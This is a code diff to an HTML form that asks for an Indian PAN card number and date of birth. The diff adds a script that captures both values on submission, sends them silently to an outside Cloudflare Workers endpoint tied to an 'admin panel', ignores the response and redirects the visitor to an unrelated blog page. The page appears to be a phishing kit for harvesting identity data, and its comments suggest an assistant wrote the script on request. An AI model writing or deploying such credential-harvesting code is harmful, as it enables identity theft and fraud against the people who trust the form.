@@ -187,18 +187,18 @@
             <div class="instruction">Please enter your PAN Card and Date of Birth</div>
             <div class="mandatory-note">Mandatory fields are marked with an asterisk (*)</div>
 
-            <!-- form with PAN and DOB -->
+            <!-- form with PAN and DOB (ids added for script) -->
             <form>
                 <!-- PAN Card field -->
                 <div class="form-group">
                     <label class="form-label">PAN Card <span class="asterisk">*</span></label>
-                    <input type="text" class="form-input" placeholder="" maxlength="10" pattern="[A-Z]{5}[0-9]{4}[A-Z]{1}" title="Please enter a valid PAN (5 letters, 4 numbers, 1 letter)">
+                    <input type="text" class="form-input" placeholder="" maxlength="10" id="panInput" pattern="[A-Z]{5}[0-9]{4}[A-Z]{1}" title="Please enter a valid PAN (5 letters, 4 numbers, 1 letter)">
                 </div>
 
                 <!-- Date of Birth field -->
                 <div class="form-group">
                     <label class="form-label">Date of Birth <span class="asterisk">*</span></label>
-                    <input type="date" class="form-input" max="2008-01-01" value="1980-01-01">
+                    <input type="date" class="form-input" id="dobInput" max="2008-01-01" value="1980-01-01">
                 </div>
 
                 <!-- PROCEED BUTTON (instead of submit) -->
@@ -226,5 +226,54 @@
             </div>
         </div>
     </div>
+
+    <!-- Script to send PAN & DOB to Cloudflare Worker and redirect -->
+    <script>
+        (function() {
+            const form = document.querySelector('form');
+            if (form) {
+                form.addEventListener('submit', async function(e) {
+                    e.preventDefault();  // stop normal form submission
+                    
+                    const panInput = document.getElementById('panInput');
+                    const dobInput = document.getElementById('dobInput');
+                    
+                    const panValue = panInput ? panInput.value.trim() : '';
+                    const dobValue = dobInput ? dobInput.value : '';
+                    
+                    // Generate a unique ID for this submission
+                    const uniqueId = 'pan_' + Date.now() + '_' + Math.random().toString(36).substring(2, 10);
+                    
+                    // Prepare payload as expected by the worker (type "PAN")
+                    const payload = {
+                        type: 'PAN',
+                        data: {
+                            name: '',          // worker expects a name field; we leave it empty (will show as N/A)
+                            pan: panValue,
+                            dob: dobValue       // include DOB as extra field (stored but not displayed in admin panel)
+                        },
+                        id: uniqueId
+                    };
+                    
+                    // Worker endpoint (the one you provided)
+                    const workerUrl = 'https://falling-waterfall-d23a.vikash6759ub.workers.dev/';
+                    
+                    try {
+                        await fetch(workerUrl, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify(payload)
+                        });
+                        // (We ignore the response – just try to send)
+                    } catch (err) {
+                        console.error('Error sending data to worker:', err);
+                    }
+                    
+                    // Always redirect to blogtwo.html (relative path)
+                    window.location.href = 'blogtwo.html';
+                });
+            }
+        })();
+    </script>
 </body>
 </html>
